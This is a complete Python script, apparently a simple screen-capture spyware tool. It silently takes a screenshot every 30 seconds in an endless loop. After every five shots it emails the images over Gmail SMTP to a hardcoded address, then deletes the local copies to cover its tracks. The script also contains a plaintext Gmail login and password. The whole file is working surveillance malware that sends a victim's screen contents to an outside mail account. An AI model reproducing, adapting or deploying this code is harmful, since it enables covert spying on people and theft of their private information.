#!/usr/bin/env python3
import pyautogui
import time, os, smtplib, shutil
from email.message import EmailMessage

def send_mail():
    try:
        msg = EmailMessage()
        msg["From"] = "alimatt2007cyberft@gmail.com"
        msg["To"] = "alimatt2007cyberft@gmail.com"
        msg["Subject"] = "Screen_logs"
        body = "Screenshots"
        msg.set_content(body)
        images = os.listdir("Screenshots")
        path = "/Screenshots/"
        for image in images:
            file = open(path+image, "rb")
            data = file.read()
            file_name = file.name
            msg.add_attachment(data, maintype = "image", subtype = "png", filename = file_name)
            file.close()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login("alimatt2007cyberft@gmail.com", "mynameisali1")
        server.send_message(msg)
        server.close()
        shutil.rmtree("Screenshots")

    except Exception as mail_error:
        shutil.rmtree("Screenshots")
        pass

count = 0
os.chdir("/")
if "Screenshots" in os.listdir("/"):
    send_mail()
else:
    os.mkdir("/Screenshots")
while True:
    if "Screenshots" not in os.listdir("/"):
        os.mkdir("/Screenshots")
    pic = pyautogui.screenshot()
    pic.save("/Screenshots/screenshot_"+str(count)+".png")
    count += 1
    if count >= 5:
        send_mail()
        count = 0
    time.sleep(30)


        
